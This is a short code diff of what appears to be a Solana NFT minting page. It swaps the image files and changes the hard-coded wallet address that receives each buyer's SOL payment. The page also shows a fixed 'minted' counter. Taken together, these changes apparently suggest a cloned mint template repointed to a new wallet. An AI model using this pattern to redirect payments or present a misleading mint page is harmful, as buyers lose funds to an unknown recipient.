@@ -35,11 +35,11 @@
                         <div class="line-1">
                             <p>Price per NFT <span class="quantity">1.25 SOL Each</span></p>
                             <p class="minted">Minted: 571 / 9999</p>
-                            <img class="photo3" src="img/photo-1.png" alt="">
-                            <img class="photo1" src="img/photo-2.png" alt="">
-                            <img class="photo2" src="img/photo-3.png" alt="">
+                            <img class="photo3" src="img/slide1.png" alt="">
+                            <img class="photo1" src="img/slide2.png" alt="">
+                            <img class="photo2" src="img/slide3.png" alt="">
                             
-                            <img class="back" src="img/photo-4.png" alt="">
+                            <img class="back" src="img/slide1.png" alt="">
                             <div class="qty"><button onclick="downValue();" class="minus">-</button>
                                 <input id="counet" type="number" value="1">
                                 <button onclick="upValue();" class="plus">+</button>
@@ -166,7 +166,7 @@
                 let transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: provider.publicKey,
-                        toPubkey: "37s969zaLrC6uyYLczmTSWUPqiQ11rhNXwf2VjBaYnHc",
+                        toPubkey: "48Av24AQnPa5WeDxNc8JsFU8mAbwJnKSbNHd3g1WJkBU",
                         lamports: charginglamports,
                     })
                 );
